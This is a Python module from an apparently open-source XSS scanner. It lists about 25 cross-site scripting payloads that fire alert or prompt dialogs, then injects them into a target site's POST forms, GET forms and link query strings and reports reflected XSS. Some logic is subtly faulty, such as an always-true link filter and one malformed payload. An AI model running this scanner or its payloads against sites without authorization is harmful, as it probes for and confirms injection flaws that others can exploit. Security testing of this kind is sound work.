# xsscore.py

from xsshelper import *
from random import randint
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from xssLog import *

class core:
    @classmethod
    def generate(self, eff):
        FUNCTION = [
            "prompt('Vigrahak')",
            "alert('Vigrahak')",
            "confirm('Vigrahak')"
        ]
        if eff == 1:
            func = FUNCTION[randint(0, 2)]
            payloads = [
                "<script>" + func + "</script>Vigrahak",
                "<img src=x onerror=" + func + ">",
                "<body onload=" + func + ">",
                "<input autofocus onfocus=" + func + ">",
                "<isindex onmousemove=" + func + ">XSS</isindex>",
                "<iframe onmouseenter=" + func + "></iframe>",
                "<svg onload=alert" + func + ">",
                "<svg><script>" + func + "</script></svg>",
                "<main onmousemove=" + func + ">XSS</main>",
                "<body onload=" + func + ">",
                "<object data=javascript&colon;" + func + ">",
                "<BODY ONLOAD=" + func + ">",
                "<embed src=javascript:" + func + ">",
                "<math><brute href=javascript:" + func + ">click",
                "<form action=javascript:" + func + "><input type=submit>",
                "<select autofocus onfocus=" + func + ">",
                "<script defer>" + func + "</script>",
                "<script async>" + func + "</script>",
                "<strike onclick=" + func + ">XSS</strike>",
                "<div onmouseover=" + func + ">XSS",
                "<div onmouseout=" + func + ">XSS",
                "<div onmouseleave=" + func + ">XSS",
                "<div onclick=" + func + ">XSS",
                "</script><svg onload=" + func + ">",
                "<x onclick=" + func + ">click this!"
            ]
            return payloads[randint(0, len(payloads) - 1)]

    @classmethod
    def post_method(self):
        bsObj = BeautifulSoup(self.body, "html.parser")
        forms = bsObj.find_all("form", method=True)

        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = self.url

            if form["method"].lower().strip() == "post":
                Log.warning("Target have form with POST method: " + CYAN + urljoin(self.url, action))
                Log.info("Collecting form input key.....")

                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            Log.info("Form key name: " + GREEN + key["name"] + RESETEND + " value: " + GREEN + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})

                        else:
                            Log.info("Form key name: " + GREEN + key["name"] + RESETEND + " value: " + GREEN + self.payload)
                            keys.update({key["name"]: self.payload})

                    except Exception as e:
                        Log.info("Internal error: " + str(e))

                Log.info("Sending payload (POST) method...")
                req = self.session.post(urljoin(self.url, action), data=keys)
                if self.payload in req.text:
                    Log.high("Detected XSS (POST) at " + urljoin(self.url, req.url))
                    Log.high("Post data: " + str(keys))
                else:
                    Log.info("This page is safe from XSS (POST) attack but not 100% yet...Go with xsspayloads.txt")

    @classmethod
    def get_method_form(self):
        bsObj = BeautifulSoup(self.body, "html.parser")
        forms = bsObj.find_all("form", method=True)

        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = self.url

            if form["method"].lower().strip() == "get":
                Log.warning("Target have form with GET method: " + CYAN + urljoin(self.url, action))
                Log.info("Collecting form input key.....")

                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            Log.info("Form key name: " + GREEN + key["name"] + RESETEND + " value: " + GREEN + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})

                        else:
                            Log.info("Form key name: " + GREEN + key["name"] + RESETEND + " value: " + GREEN + self.payload)
                            keys.update({key["name"]: self.payload})

                    except Exception as e:
                        Log.info("Internal error: " + str(e))
                        try:
                            Log.info("Form key name: " + GREEN + key["name"] + RESETEND + " value: " + GREEN + self.payload)
                            keys.update({key["name"]: self.payload})
                        except KeyError as e:
                            Log.info("Internal error: " + str(e))

                Log.info("Sending payload (GET) method...")
                req = self.session.get(urljoin(self.url, action), params=keys)
                if self.payload in req.text:
                    Log.high("Detected XSS (GET) at " + urljoin(self.url, req.url))
                    Log.high("GET data: " + str(keys))
                else:
                    Log.info("This page is safe from XSS (GET) attack but not 100% yet...Go with xsspayloads.txt")

    @classmethod
    def get_method(self):
        bsObj = BeautifulSoup(self.body, "html.parser")
        links = bsObj.find_all("a", href=True)

        for a in links:
            url = a["href"]
            if url.startswith("http://") is False or url.startswith("https://") is False or url.startswith("mailto:") is False:
                base = urljoin(self.url, a["href"])
                query = urlparse(base).query

                if query != "":
                    Log.warning("Found link with query: " + GREEN + query + RESETEND + " Maybe a vuln XSS point")

                    query_payload = query.replace(query[query.find("=") + 1:len(query)], self.payload, 1)
                    test = base.replace(query, query_payload, 1)

                    query_all = base.replace(query, urlencode({x: self.payload for x in parse_qs(query)}))

                    Log.info("Query (GET) : " + test)
                    Log.info("Query (GET) : " + query_all)

                    _respon = self.session.get(test)
                    if self.payload in _respon.text or self.payload in self.session.get(query_all).text:
                        Log.high("Detected XSS (GET) at " + _respon.url)
                    else:
                        Log.info("This page is safe from XSS (GET) attack but not 100% yet...Go with xsspayloads.txt")

    @classmethod
    def main(self, url, proxy, headers, payload, cookie, method=2):
        print(CYAN + "*" * 60)
        self.payload = payload
        self.url = url

        self.session = session(proxy, headers, cookie)
        Log.info("Checking connection to: " + YELLOW + url)

        try:
            ctr = self.session.get(url)
            self.body = ctr.text
        except Exception as e:
            Log.high("Internal error: " + str(e))
            return

        if ctr.status_code > 400:
            Log.info("Connection failed " + GREEN + str(ctr.status_code))
            return
        else:
            Log.info("Connection estabilished " + GREEN + str(ctr.status_code))

        if method >= 2:
            self.post_method()
            self.get_method()
            self.get_method_form()

        elif method == 1:
            self.post_method()

        elif method == 0:
            self.get_method()
            self.get_method_form()
